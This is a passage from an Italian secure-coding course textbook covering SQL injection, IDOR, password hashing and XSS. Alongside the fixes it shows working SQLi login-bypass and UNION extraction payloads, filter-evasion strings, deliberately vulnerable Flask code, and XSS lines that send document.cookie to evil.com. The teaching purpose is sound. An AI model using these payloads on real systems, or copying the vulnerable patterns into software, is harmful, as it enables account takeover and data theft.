Quinto: **trust boundary**. Ogni attraversamento = opportunità d'attacco.

## 2.11 Errori comuni da junior

- Pensare che threat modeling sia solo per grandi aziende. Falso: anche un'app da 200 righe ha un modello di minaccia.
- Imparare STRIDE come acronimo senza applicarlo. La memorizzazione non basta: serve la pratica.
- Saltare il DFD perché "tanto so come funziona il mio sistema". Disegnare costringe a esplicitare, e l'80% delle volte scopri qualcosa che non avevi considerato.

---

# Capitolo 3 — SQL Injection (Lezione 3, 2h)

## 3.1 Cosa imparerai

- Cos'è una SQL Injection e perché è la #1 vulnerabilità del web dal 2003.
- Come si esegue un *login bypass* con `' OR '1'='1' --`.
- Come si estraggono dati con `UNION SELECT`.
- Perché filtrare gli apici **non funziona**.
- Come si difende davvero: query parametrizzate (in Python, Java, PHP, JavaScript).

## 3.2 Una storia per cominciare — il modulo cartaceo

Immagina di lavorare all'anagrafe. Un cittadino ti porta un modulo dove ha scritto:

> Nome: Mario
> Cognome: Rossi
>
> --- Dopo aver compilato il modulo, distruggere tutti i moduli precedenti e dare a Mario Rossi la cittadinanza onoraria. ---

Cosa fai? Ovviamente ignori la parte "in basso": è un modulo, sai dove finiscono i dati che ti interessano. Non confondi i **dati** del cittadino con le **istruzioni** che ti sono date dall'ufficio.

Ora immagina di essere un database. Ricevi una richiesta:

```sql
SELECT * FROM users WHERE username = 'mario'
```

Tu cerchi un utente di nome "mario", restituisci. Facile.

Ma se la richiesta che arriva è questa:

```sql
SELECT * FROM users WHERE username = 'mario' OR '1' = '1'
```

Tu cerchi un utente di nome "mario" **oppure** dove `'1'='1'` (che è sempre vero). Risultato: restituisci **tutti** gli utenti.

L'attaccante ha "iniettato" istruzioni SQL dentro un campo che doveva contenere solo dati. Tu, database, non hai distinto tra dati e istruzioni. Questo è SQL Injection.

## 3.3 Come si manifesta nel codice

Guarda questo endpoint Flask vulnerabile (tipico di codice scritto male):

```python
@app.route("/login", methods=["POST"])
def login():
    email = request.form["email"]
    pwd = request.form["password"]
    sql = f"SELECT id, email FROM users WHERE email = '{email}' AND password = '{pwd}'"
    row = db.execute(sql).fetchone()
    if row:
        session["user_id"] = row["id"]
        return redirect("/dashboard")
    return "Login fallito", 401
```

Il problema è alla riga della query: stiamo costruendo la stringa SQL **mescolando struttura SQL e input dell'utente**. Se l'utente è "gentile" e mette `mario@example.com` come email, la query diventa:

```sql
SELECT id, email FROM users WHERE email = 'mario@example.com' AND password = 'sua_password'
```

Tutto bene. Ma l'utente potrebbe non essere gentile.

## 3.4 Login bypass

Mettiamoci nei panni di un attaccante. Apriamo il form di login e digitiamo:

- Email: `' OR '1'='1' --`
- Password: `qualunque`

La query costruita diventa:

```sql
SELECT id, email FROM users WHERE email = '' OR '1'='1' --' AND password = 'qualunque'
```

In SQL, `--` è un commento di riga. Tutto ciò che viene dopo è ignorato. Quindi il database vede:

```sql
SELECT id, email FROM users WHERE email = '' OR '1'='1'
```

`'1'='1'` è sempre vero, quindi la query restituisce **tutti** gli utenti, e l'app prende il primo. L'attaccante è loggato **senza conoscere alcuna password**.

Variante: l'attaccante sa che esiste un admin. Inserisce:

- Email: `admin@bank.it' --`
- Password: `qualunque`

La query diventa:

```sql
SELECT id, email FROM users WHERE email = 'admin@bank.it' --' AND password = 'qualunque'
```

Cioè:

```sql
SELECT id, email FROM users WHERE email = 'admin@bank.it'
```

L'app trova l'admin, lo logga. L'attaccante è amministratore.

Questo si chiama **login bypass**. È in OWASP Top 10 dal 2003. Equifax, Heartland, TalkTalk: tutti SQLi.

## 3.5 Estrazione dati con UNION SELECT

Il login bypass è grave, ma l'attaccante può fare di peggio: leggere **dati arbitrari** dal database, anche da tabelle a cui l'app non dà accesso.

Supponiamo che l'app abbia anche una pagina di ricerca:

```python
@app.route("/cerca")
def cerca():
    q = request.args.get("q", "")
    sql = f"SELECT contenuto FROM messaggi WHERE contenuto LIKE '%{q}%'"
    return [r[0] for r in db.execute(sql).fetchall()]
```

L'attaccante cerca:

```
xyz' UNION SELECT email FROM users --
```

La query diventa:

```sql
SELECT contenuto FROM messaggi WHERE contenuto LIKE '%xyz' UNION SELECT email FROM users --%'
```

`UNION` in SQL unisce risultati di due query. L'app, pensando di mostrare "messaggi", in realtà mostra **le email di tutti gli utenti**.

Variante peggiore:

```
xyz' UNION SELECT email || ':' || password FROM users --
```

L'app mostra **email e password** di tutti gli utenti, in chiaro (se sono salvate in chiaro, ma anche se sono hashate male possono essere bruteforce-ate offline).

## 3.6 Perché filtrare gli apici NON funziona

A questo punto un programmatore inesperto pensa: "facile, filtro gli apici". Vediamo se funziona.

```python
email = request.form["email"].replace("'", "")
sql = f"SELECT id FROM users WHERE email = '{email}' AND password = '{pwd}'"
```

L'attaccante prova:

- Email: `admin@bank.it' --` → diventa `admin@bank.it --` → non funziona più.

Vittoria? No.

L'attaccante prova varianti:

- `admin@bank.it" --` → con doppi apici (SQLite li accetta come delimitatori)
- `%27 OR %271%27=%271` → URL-encoded
- `\' OR \'1\'=\'1` → escape con backslash
- `admin@bank.itʼ` → carattere Unicode "modifier letter apostrophe"
- `1 OR 1=1` → injection numerica, se il campo non avesse apici intorno

Conclusione: filtrare caratteri è una **strategia perdente**. Gli attaccanti hanno **infiniti modi** di aggirare la blacklist. Funziona solo finché non arriva qualcuno bravo.

**Regola**: usa whitelist, non blacklist. Ancora meglio, **non filtrare**, ma **separare struttura e dati**. Vediamo come.

## 3.7 La correzione: query parametrizzate

L'idea è semplice: **non costruire la stringa SQL mescolando struttura e dati**. La query è una stringa fissa, i dati sono passati separatamente al database, che li tratta come **valori già tipati**, non come SQL da interpretare.

In Python con sqlite3:

```python
sql = "SELECT id, email FROM users WHERE email = ? AND password = ?"
row = db.execute(sql, (email, pwd)).fetchone()
```

I `?` sono **placeholder**. Il driver del database si occupa di:

1. Compilare la query SQL prima (la struttura è già fissa).
2. Mandare i dati al motore SQL come **valori**, mai come SQL.
3. Il motore esegue la query trattando i dati come dati.

Riproviamo gli attacchi:

- Email: `' OR '1'='1' --` → il driver cerca un utente con email **letteralmente** `' OR '1'='1' --`. Non lo trova. Login fallito. ✓
- Email: `xyz' UNION SELECT ...` → il driver cerca messaggi con quella stringa letterale. Niente risultati. ✓

L'attacco SQLi diventa **impossibile per design**, non perché filtri qualcosa, ma perché hai cambiato il modo in cui scrivi la query.

## 3.8 Stessa idea negli altri linguaggi

In **Java** (con `PreparedStatement`):

```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT id, email FROM users WHERE email = ? AND password = ?"
);
ps.setString(1, email);
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

In **PHP** (con PDO):

```php
$stmt = $pdo->prepare(
    "SELECT id, email FROM users WHERE email = ? AND password = ?"
);
$stmt->execute([$email, $password]);
$row = $stmt->fetch();
```

In **JavaScript / Node.js** (con better-sqlite3):

```javascript
const stmt = db.prepare(
    "SELECT id, email FROM users WHERE email = ? AND password = ?"
);
const row = stmt.get(email, password);
```

Sintassi diversa, idea identica. **Mai concatenare input nelle query, sempre placeholder.**

## 3.9 Cosa fa l'ORM al posto tuo

Un **ORM** (Object Relational Mapper) come SQLAlchemy in Python, Hibernate in Java, Eloquent in PHP, **fa la parametrizzazione automatica**. In SQLAlchemy:

```python
user = User.query.filter_by(email=email, password=pwd).first()
```

L'ORM costruisce internamente una query parametrizzata. Non puoi accidentalmente fare SQL injection, **a meno che** tu non usi `text()` o `raw()` con f-string (anti-pattern).

Quindi: nei progetti seri si usa quasi sempre un ORM. È più sicuro per default.

## 3.10 Difese aggiuntive in profondità

Le query parametrizzate sono la difesa **primaria**. In produzione si aggiungono altri strati:

1. **Least privilege per l'utente DB**: l'utente del database usato dall'app deve avere solo `SELECT, INSERT, UPDATE, DELETE` sulle sue tabelle. Mai `DROP`, `CREATE`, `GRANT`. Se un attaccante riesce comunque a fare SQLi, **non può cancellare tabelle o leggere il dizionario dati**.

2. **Errori generici al client**: mai mostrare lo stack trace SQL al browser. L'errore SQL rivela la struttura delle tabelle. Logga internamente lo stack trace, rispondi al client con un generico "errore interno del server".

3. **Web Application Firewall (WAF)**: davanti all'app, un WAF (Cloudflare, AWS WAF, ModSecurity) filtra pattern SQLi noti. **Non sostituisce** le query parametrizzate, è un'aggiunta.

4. **Rate limiting sul login**: 5 tentativi al minuto per IP rende impossibile il brute force.

5. **Audit log**: logga ogni login con email, IP, esito. Se vedi 100 tentativi falliti su `admin@bank.it' --`, sai che è un attacco in corso.

## 3.11 Laboratorio della Lezione 3 — passo passo

In aula costruiamo **mini-banca**, un'app vulnerabile, e poi la correggiamo.

**Step 0**: clone del repository del corso.

```bash
git clone https://github.com/ss4i/corso-its-cybersecurity-32h
cd corso-its-cybersecurity-32h/02_lab/M6_sqli_step_by_step
python -m venv .venv
.\.venv\Scripts\Activate.ps1     # Windows
# oppure: source .venv/bin/activate     # Mac/Linux
pip install -r requirements.txt
python seed.py
```

**Step 1**: avvio app vulnerabile.

```bash
python app.py
```

Apri http://127.0.0.1:5000 nel browser.

**Step 2**: login legittimo. Email `alice@bank.it`, password `alice_pass`. Vedi la dashboard di Alice con saldo 1500€.

**Step 3**: login bypass. Logout, riapri il form, e prova:

- Email: `admin@bank.it' --`
- Password: qualunque

Sei dentro come admin. Saldo 999999€. **Senza conoscere la password.**

**Step 4**: estrazione dati. Vai sulla pagina di ricerca messaggi. Cerca:

```
xyz' UNION SELECT email || ':' || password FROM users --
```

Vedi email e password di tutti gli utenti.

**Step 5**: correzione. Apri `app.py` in VS Code. Modifica le due query rendendole parametrizzate:

```python
sql = "SELECT id, email, saldo FROM users WHERE email = ? AND password = ?"
row = conn.execute(sql, (email, pwd)).fetchone()
```

E:

```python
sql = "SELECT contenuto FROM messaggi_segreti WHERE contenuto LIKE ?"
risultati = [r[0] for r in conn.execute(sql, (f"%{q}%",)).fetchall()]
```

Salva. Riavvia l'app. Riprova gli stessi attacchi. **Non funzionano più**.

**Step 6**: test automatici. Nel terminale:

```bash
pytest test_app.py -v
```

Tutti i test passano. Se domani un altro programmatore reintroduce SQLi, i test falliscono in CI e si accorge subito.

## 3.12 Cosa portarti via dalla Lezione 3

Primo: **SQLi è la #1 dal 2003**. Non è una vulnerabilità "esotica", è la più diffusa.

Secondo: **mai f-string in SQL**. Mai concatenazione. Sempre placeholder `?`.

Terzo: **filtrare apici è una strategia perdente**. Usa whitelist, meglio ancora parametrizzazione.

Quarto: **ORM è più sicuro per default**. Quando puoi, usalo.

Quinto: **difese in profondità**. Query parametrizzate + least privilege DB + errori generici + WAF + rate limit. Sono cinque strati, non uno.

## 3.13 Errori comuni da junior

- Pensare "ho già SQLi sotto controllo perché filtro gli apici". No. Solo le query parametrizzate proteggono davvero.
- Concatenare input "solo nel campo del nome tabella" perché "non si può parametrizzare". Sbagliato: lì usi whitelist (lista di nomi tabella ammessi).
- Lasciare gli errori SQL al client "per debug". Dimentichi di toglierli, vanno in produzione, l'attaccante li usa per mappare il DB.

---

# Capitolo 4 — Autorizzazione e password (Lezione 4, 2h)

## 4.1 Cosa imparerai

- La differenza tra **autenticazione** (sei tu?) e **autorizzazione** (puoi fare X?).
- Cos'è un **IDOR** e come si corregge.
- I codici di stato HTTP 401 vs 403 e quando usarli.
- Perché MD5 e SHA-256 **non vanno** per le password.
- Come hashare correttamente con **bcrypt**.

## 4.2 Autenticazione vs Autorizzazione

Sono due cose diverse. Confonderle è il bug concettuale numero 1 dei programmatori junior.

**Autenticazione** (in inglese *authentication*, abbreviata "authn") = "chi sei?". Lo verifichi al login: l'utente fornisce credenziali (email + password, o un token, o una chiave biometrica), il sistema verifica e ti riconosce.

**Autorizzazione** (in inglese *authorization*, abbreviata "authz") = "cosa puoi fare?". Si verifica **a ogni richiesta dopo il login**: l'utente loggato può accedere a quella risorsa? Può eseguire quell'azione?

Esempio concreto: nella tua app di banking, Alice si logga inserendo email e password. Authn fatta. Ma quando Alice chiede di vedere la fattura numero 42, devi verificare se la fattura 42 appartiene **ad Alice**. Se appartiene a Bob, devi rifiutare. Questa è authz.

Un sistema può avere ottima authn (login con MFA, password robuste, bcrypt) e pessima authz (chiunque autenticato può vedere dati di chiunque). Sono ortogonali.

## 4.3 IDOR: Insecure Direct Object Reference

IDOR è il caso classico di authz mancante. L'utente loggato cambia un identificatore nell'URL e accede a risorse che non sono sue.

Codice tipico vulnerabile in Flask:

```python
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.get(fid)
    return render_template("fattura.html", fattura=f)
```

Sembra a posto: `@login_required` impone l'autenticazione. Ma manca **il controllo che la fattura appartenga all'utente loggato**.

Alice è loggata, vede `/fattura/42` (sua). Cambia l'URL a `/fattura/43` → vede la fattura di Bob.

E non solo: con uno script può scaricare tutte le fatture (`/fattura/1`, `/fattura/2`, ..., `/fattura/N`). In pochi secondi ha esfiltrato tutto il database fatturazione.

## 4.4 Caso reale italiano

Nel 2022, il Garante Privacy ha multato un e-commerce italiano per ~100.000€ per esattamente questo: URL `/ordine/<id>` non protetti. Cambiando l'ID si vedevano ordini di altri clienti, con indirizzi, prodotti, importi. Articoli GDPR violati: 25 (privacy by design) e 32 (sicurezza del trattamento).

Una sola riga di codice in più — il controllo di proprietà — avrebbe risparmiato 100.000€.

## 4.5 La correzione: ownership check server-side

Aggiungi un controllo che la risorsa appartenga all'utente:

```python
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.get(fid)
    if f is None:
        abort(404)
    if f.owner_id != session["user_id"]:
        abort(403)
    return render_template("fattura.html", fattura=f)
```

Pattern alternativo, più pulito: filtri direttamente per owner nella query:

```python
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.filter_by(
        id=fid,
        owner_id=session["user_id"]
    ).first_or_404()
    return render_template("fattura.html", fattura=f)
```

Se la fattura non esiste **o** non è dell'utente, ricevi 404. Più semplice e meno error-prone.

## 4.6 Status code: 401 vs 403 vs 404

Sono tre status code HTTP che confondono spesso. Ti spiego le tre situazioni in modo netto:

- **401 Unauthorized** → "non sei autenticato". Manca il login, o il token è scaduto. (Il nome storico è fuorviante: dovrebbe essere "Unauthenticated".)
- **403 Forbidden** → "sei autenticato ma non hai i permessi". Esempio: utente normale prova ad accedere a `/admin`. Oppure: Alice prova a vedere la fattura di Bob.
- **404 Not Found** → "la risorsa non esiste". Esempio: digiti un URL inesistente.

Per IDOR la risposta corretta è **403**. Alcuni preferiscono 404 per non "rivelare" che l'ID esiste (security by obscurity), ma è una pratica controversa: 404 confonde i log e i tool. Personalmente preferisco 403, oppure 404 da `filter_by(...).first_or_404()` per non distinguere "non esiste" da "non tuo".

## 4.7 La seconda metà del capitolo: le password

Adesso cambiamo argomento. Parliamo di **come si salvano le password**.

## 4.8 Encoding, hashing, encryption: tre cose diverse

Tre operazioni che la gente confonde:

**Encoding** (esempio: Base64). È una trasformazione **reversibile e banale**. Serve a rappresentare dati in formati specifici (es. trasportare bytes via email). **Non è cifratura.** Chiunque può decodificare. Esempio: `SGVsbG8gV29ybGQ=` è Base64 di "Hello World".

**Hashing** (esempio: SHA-256, bcrypt). Trasformazione **non reversibile**. Da un input X produci un hash Y; da Y non puoi tornare a X (se non per brute force). Usato per password, integrità di file, fingerprint.

**Encryption** (esempio: AES). Trasformazione **reversibile con una chiave**. Da un testo X e una chiave K produci il cifrato Y; con la stessa chiave K puoi tornare a X.

Per le password si usa **hashing**, mai encryption. Perché? Perché se cifri le password e qualcuno ruba il DB **insieme** alla chiave (succede), le password sono in chiaro. Se invece le hash, anche con il DB in mano l'attaccante non può tornare alle password (se l'hashing è fatto bene).

## 4.9 Perché MD5 e SHA-256 NON vanno per le password

Sentirai dire: "uso SHA-256, è un hash sicuro". Per le password è sbagliato. Vediamo perché.

**Velocità**. SHA-256 è progettato per essere **veloce**. Una GPU moderna calcola **miliardi** di SHA-256 al secondo. Se un attaccante ruba un DB con 10.000 password hashate in SHA-256, può fare brute force su tutte in poche ore.

**Rainbow tables**. Se non aggiungi un *salt* (vedi sotto), le password identiche producono hash identici. L'attaccante può precalcolare le tabelle di tutti gli hash delle password più comuni ("password", "123456", "qwerty", ...) e cercare matches istantanei.

**MD5 e SHA-1 sono morti**. MD5 ha **collisioni note** (input diversi → stesso hash). SHA-1 anche. Nessuno con un minimo di competenza li usa più.

## 4.10 Salt: cosa è, perché è obbligatorio

Un **salt** è un valore casuale, diverso per ogni utente, che viene aggiunto alla password prima dell'hash:

```
hash_salvato = hash(password + salt)
```

Esempio: Alice ha password "segreta". Salt random "x7Yk2": hash = `SHA256("segretax7Yk2")`.
Bob ha password "segreta" (stessa). Salt random "qP3mN": hash = `SHA256("segretaqP3mN")`. Hash **diverso**, anche con password uguale.

Il salt **non è segreto**, è salvato accanto all'hash. Ma rende inutile la rainbow table: l'attaccante deve ricalcolare per ogni utente.

## 4.11 bcrypt: la scelta sicura

**bcrypt** è un algoritmo di hashing specifico per le password. Tre caratteristiche:

1. **Salt automatico**: la libreria lo genera per te.
2. **Work factor (cost) configurabile**: puoi rendere l'hash più lento aumentando il cost. Cost 12 ≈ 250ms per hash. Per l'utente legittimo (1 hash per login) è impercettibile. Per un attaccante che vuole fare brute force su milioni di password, è devastante.
3. **Standard de facto**: usato da Postgresql, Spring Security, Django, Laravel. Maturo, ben testato.

In Python:

```python
import bcrypt

# Hash di una nuova password
def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt(rounds=12))

# Verifica al login
def verify_password(password: str, hash_db: bytes) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), hash_db)
```

In Java (Spring Security):

```java
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);
boolean ok = encoder.matches(input, hash);
```

In PHP:

```php
$hash = password_hash($pwd, PASSWORD_BCRYPT, ['cost' => 12]);
$ok = password_verify($input, $hash);
```

Tre linguaggi, una libreria standard, una riga. Più semplice di salvare in chiaro, e infinitamente più sicuro.

## 4.12 Argon2id: l'alternativa moderna

**Argon2id** è un algoritmo più recente (2015), vincitore della Password Hashing Competition. Più sicuro di bcrypt contro attacchi su hardware moderno (GPU, ASIC). Per nuove app, è la scelta consigliata.

In Python:

```python
from argon2 import PasswordHasher
ph = PasswordHasher()
hash_db = ph.hash("segretissima")
ph.verify(hash_db, "segretissima")  # solleva eccezione se sbagliata
```

bcrypt resta una scelta ottima e diffusissima. Argon2id è il "next big thing".

## 4.13 Diagnosi visiva nel DB

Apri il database della tua app con DB Browser for SQLite. Guarda la colonna `password` della tabella utenti.

| Cosa vedi | Diagnosi |
|-----------|----------|
| `mariopwd` (testo leggibile) | 🔥 Password in chiaro. Catastrofico. |
| `5f4dcc3b5aa765d61d8327deb882cf99` (32 caratteri esadecimali) | MD5. Morto, da migrare. |
| `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` (40 caratteri esadecimali) | SHA-1. Morto. |
| `e3b0c44298fc1c149afbf4c8996fb924...` (64 caratteri esadecimali) | SHA-256 senza salt. Inadeguato. |
| `$2b$12$KIXbN...` (inizia con $2b$) | **bcrypt**. ✓ |
| `$argon2id$v=19$m=65536...` | **Argon2id**. ✓ |

Se nel DB della tua app vedi qualcosa che non è bcrypt o Argon2id → tocca migrare.

## 4.14 Laboratorio della Lezione 4

In aula, due parti:

**Parte 1 — IDOR**. Estendi l'app `bancapiccola-mini` del lab precedente aggiungendo una tabella fatture e un endpoint `/fattura/<id>`. Inizialmente senza ownership check. Tutti provano l'attacco IDOR cambiando l'ID nell'URL e vedendo fatture altrui. Poi aggiungono il controllo `filter_by(owner_id=...)`. Riprovano l'attacco: 404.

**Parte 2 — Password hashing**. Apri il DB di `bancapiccola-mini` con DB Browser. Le password sono in chiaro (per il lab). Riscrivi `seed.py` per usare bcrypt:

```python
import bcrypt
password_hash = bcrypt.hashpw("alice_pass".encode(), bcrypt.gensalt(rounds=12))
```

Riscrivi il `login()` per usare `bcrypt.checkpw`. Riavvia, prova il login. Apri il DB con DB Browser: vedi `$2b$12$...`. Le password sono ora **non bruteforce-abili** in tempi ragionevoli.

## 4.15 Cosa portarti via dalla Lezione 4

Primo: **authn ≠ authz**. Sono due cose diverse. Authn al login, authz a ogni richiesta.

Secondo: **IDOR**. Verifica sempre che la risorsa che restituisci appartenga all'utente loggato.

Terzo: **401 ≠ 403**. 401 non autenticato, 403 autenticato ma non autorizzato.

Quarto: **MD5/SHA per password = NO**. Usa bcrypt o Argon2id.

Quinto: **bcrypt è una riga di codice**. Non c'è scusa per non usarlo.

## 4.16 Errori comuni

- "Nascondo gli ID nell'UI così l'attaccante non li conosce". Security by obscurity. Inutile, gli ID si trovano in 5 minuti.
- "Salvo le password cifrate con AES". No, hashale. AES è reversibile, hai bisogno di non poterle decifrare.
- "Uso SHA-256 con salt". È meglio di niente, ma SHA-256 è troppo veloce su GPU. Usa bcrypt.
- "Forzo cambio password ogni 90 giorni". NIST l'ha sconsigliato dal 2017: porta a password peggiori (gli utenti aggiungono "1", "2", "3"). Meglio MFA + password robuste.

---

# Capitolo 5 — XSS e header HTTP di sicurezza (Lezione 5, 2h)

## 5.1 Cosa imparerai

- Cos'è il **Cross-Site Scripting** (XSS) e i suoi tre tipi.
- Come si esegue una XSS Reflected e una XSS Stored.
- Come si difende con **escape automatico** dei template engine.
- I sei **header HTTP di sicurezza** principali e cosa fanno.
- Come configurare cookie sicuri (Secure, HttpOnly, SameSite).

## 5.2 Una storia per cominciare — il "messaggio rilanciato"

Immagina un forum online dove gli utenti pubblicano commenti. Un utente cattivo pubblica un commento che, invece di essere testo normale, contiene istruzioni nascoste:

```
Bel post! <script>fetch('https://evil.com/?c='+document.cookie)</script>
```

Il forum **non sa** che `<script>...</script>` è un'istruzione, lo salva come fosse testo. Quando un altro utente visita la pagina, il suo browser:

1. Riceve l'HTML della pagina, con dentro il commento.
2. Trova `<script>...</script>` e lo **esegue** (è il suo lavoro).
3. Lo script invia il cookie di sessione dell'utente vittima all'attaccante.

L'attaccante ora ha il cookie di sessione dell'utente: può fingersi lui (account takeover senza nemmeno chiedere la password). Questo è **XSS Stored**.

## 5.3 Come funziona un browser

Per capire XSS, un piccolo ripasso su come funziona un browser.

Quando visiti un sito, il browser fa più cose contemporaneamente:

1. Scarica l'**HTML** della pagina.
2. Trova i **CSS** e li applica.
3. Trova i tag `<script>` e **esegue** il JavaScript.
4. Permette al JS di accedere al **DOM** (la struttura della pagina), ai **cookie**, di fare richieste a server.

Il problema è il punto 3 e 4. Se l'attaccante riesce a far eseguire del **suo** JavaScript dentro la pagina del **tuo** sito, ha accesso a tutto quello che ha l'utente legittimo: cookie di sessione, dati nei form, possibilità di fare azioni a nome dell'utente.

XSS è esattamente questo: l'attaccante inietta JavaScript dentro una pagina che il browser della vittima eseguirà come se fosse fidato.

## 5.4 I tre tipi di XSS

**Reflected XSS**. Il payload è nell'URL e viene "riflesso" nella pagina. Esempio: una pagina di ricerca che mostra `Risultati per: <input dell'utente>`. Se l'input contiene `<script>alert(1)</script>`, finisce nella pagina e viene eseguito. L'attaccante invia un link malevolo via email/chat: chi clicca diventa vittima.

**Stored XSS**. Il payload è salvato nel database (commenti, profili, post) e mostrato a tutti i visitatori. È il più grave: chiunque visita la pagina è vittima, senza nemmeno cliccare un link sospetto.

**DOM-based XSS**. Il payload non passa nemmeno dal server: il JavaScript della pagina prende un valore dall'URL (`location.hash`, `location.search`) e lo inserisce nel DOM senza sanificazione. Più raro, più subdolo.

## 5.5 Esempio Reflected XSS

Codice vulnerabile (Flask con concatenazione di stringhe):

```python
@app.route("/cerca")
def cerca():
    q = request.args.get("q", "")
    return f"<h1>Risultati per: {q}</h1>"
```

Attacco: l'attaccante prepara un URL:

```
https://example.com/cerca?q=<script>alert('XSS')</script>
```

La pagina restituita dal server è:

```html
<h1>Risultati per: <script>alert('XSS')</script></h1>
```

Il browser esegue lo script, mostra l'alert. Innocuo? Sostituisci `alert('XSS')` con:

```javascript
fetch('https://evil.com/log?c=' + document.cookie)
```

L'attaccante ha il cookie di sessione della vittima.

## 5.6 Esempio Stored XSS

Pensa a un endpoint per pubblicare commenti:

```python
@app.route("/comment", methods=["POST"])
def comment():
    text = request.form["text"]
    db.execute("INSERT INTO comments (text) VALUES (?)", (text,))
    return redirect("/post")
```

Poi una pagina che li mostra:

```python
@app.route("/post")
def post():
    comments = db.execute("SELECT text FROM comments").fetchall()
    html = "<h1>Commenti</h1>"
    for c in comments:
        html += f"<p>{c[0]}</p>"
    return html
```

L'attaccante posta un commento contenente:

```html
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

Da ora in poi, **ogni visitatore** della pagina invia il proprio cookie all'attaccante. Stored XSS.

## 5.7 La difesa primaria: escape dell'output

L'idea: prima di inserire l'input dell'utente nell'HTML, **sostituisci** i caratteri pericolosi con i loro **entity HTML**:

- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#x27;`

Risultato: il browser vede `&lt;script&gt;alert(1)&lt;/script&gt;` come **testo**, non come tag. Non lo esegue, lo mostra come testo letterale.

I template engine moderni fanno questo escape **automaticamente**. In Flask, il template engine si chiama **Jinja2**:

```html
<h1>Risultati per: {{ query }}</h1>
```

Se `query = "<script>alert(1)</script>"`, Jinja2 lo trasforma automaticamente in `&lt;script&gt;alert(1)&lt;/script&gt;`. Niente XSS.

Equivalenti in altri linguaggi:

- **Java + Thymeleaf**: `<h1>Risultati per: <span th:text="${query}"></span></h1>` → escape automatico.
- **PHP + Twig**: `<h1>Risultati per: {{ query }}</h1>` → escape automatico.
- **JavaScript + React**: `<h1>Risultati per: {query}</h1>` → escape automatico.
- **PHP "raw"**: `echo $query;` → **NON** fa escape. Devi usare `echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8');`.

## 5.8 Il pericolo del `|safe`

In Jinja2 (e nei suoi equivalenti) esiste un filtro `|safe` che **disabilita** l'escape automatico:

```html
{{ comment | safe }}
```

Usato su input dell'utente, è **XSS garantita**. Mai farlo. È giustificato solo per testo statico che hai scritto tu (es. il messaggio di benvenuto dell'app, non i commenti degli utenti).

In Vue: `v-html`. In React: `dangerouslySetInnerHTML`. In Laravel/Blade: `{!! $x !!}`. Tutti pericolosi se usati su input utente.

## 5.9 Quando l'utente DEVE poter scrivere HTML "ricco"

A volte i requisiti sono: gli utenti scrivono commenti **con grassetto, corsivo, link**. Non puoi escape-are tutto, perché perderebbero la formattazione. Soluzione: **sanitization**.

Sanitization = filtri l'HTML, mantieni solo i tag e attributi sicuri, butti via il resto.

Libreria standard in Python: **bleach**.

```python
import bleach

ALLOWED_TAGS = ["p", "b", "strong", "i", "em", "a", "br"]
ALLOWED_ATTRS = {"a": ["href"]}
ALLOWED_PROTO = ["http", "https"]

safe = bleach.clean(user_html, tags=ALLOWED_TAGS,
                     attributes=ALLOWED_ATTRS, protocols=ALLOWED_PROTO, strip=True)
```

Risultato per `<p>Bel post! <script>alert(1)</script><a href="javascript:evil()">click</a></p>`:

→ `<p>Bel post! <a>click</a></p>`

Tag `<script>` rimosso, attributo `href="javascript:..."` rimosso (perché `javascript:` non è in `ALLOWED_PROTO`). Tag `<p>` e `<a>` mantenuti.

Lo stesso concetto in JavaScript: la libreria **DOMPurify**.

## 5.10 Difese stratificate: Content-Security-Policy

L'escape è la difesa primaria. La **CSP** (Content-Security-Policy) è una seconda difesa, complementare.

CSP è un header HTTP che dice al browser quali sorgenti di JavaScript, CSS, immagini sono ammesse. Esempio:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'
```

Significa: il browser deve caricare risorse **solo dal mio dominio** (`'self'`), e gli script **solo se hanno un nonce valido**.

Anche se l'attaccante riesce a iniettare `<script>alert(1)</script>`, il browser lo blocca perché manca il nonce. CSP è una difesa potente, ma complessa da configurare bene.

## 5.11 Cookie sicuri

Quando l'utente fa login, il server gli dà un cookie di sessione. Se quel cookie viene rubato (es. via XSS), l'attaccante può impersonare l'utente.

Tre attributi proteggono i cookie:

**Secure**: il browser invia il cookie **solo su HTTPS**. Se l'app viene visitata in HTTP, il browser scarta il cookie. Evita che il cookie viaggi in chiaro su reti Wi-Fi pubbliche.

**HttpOnly**: il JavaScript **non può leggere** quel cookie. `document.cookie` non lo restituisce. Anche se c'è XSS, il payload non può rubare il cookie di sessione.

**SameSite**: controlla quando il browser invia il cookie in richieste cross-site (anti-CSRF). Valori: `Strict` (mai cross-site), `Lax` (default moderno: solo navigazione top-level), `None` (sempre, richiede `Secure`).

Configurazione corretta:

```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

In Flask:

```python
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=3600,
)
```

## 5.12 I sei header HTTP di sicurezza

CSP non è l'unico header. Una webapp seria ne ha sei:

**1. Strict-Transport-Security (HSTS)**: forza il browser a usare sempre HTTPS per quel dominio, anche se l'utente digita `http://`. Difende contro downgrade attack.

**2. Content-Security-Policy (CSP)**: già visto sopra.

**3. X-Frame-Options**: blocca il *clickjacking* (mettere la tua pagina dentro un iframe per ingannare l'utente). Valore: `DENY`.

**4. X-Content-Type-Options**: blocca il *MIME sniffing* del browser. Valore unico: `nosniff`.

**5. Referrer-Policy**: controlla quanto URL viene inviato come `Referer` quando l'utente clicca un link verso un altro sito. Esempio sicuro: `strict-origin-when-cross-origin`.

**6. Permissions-Policy**: controlla quali API del browser la tua pagina può usare (camera, microfono, geolocalizzazione).

Test rapido del tuo sito: vai su **securityheaders.com** e inserisci il tuo dominio. Ti dà un voto da F ad A+.

## 5.13 Laboratorio della Lezione 5

In aula, due parti:

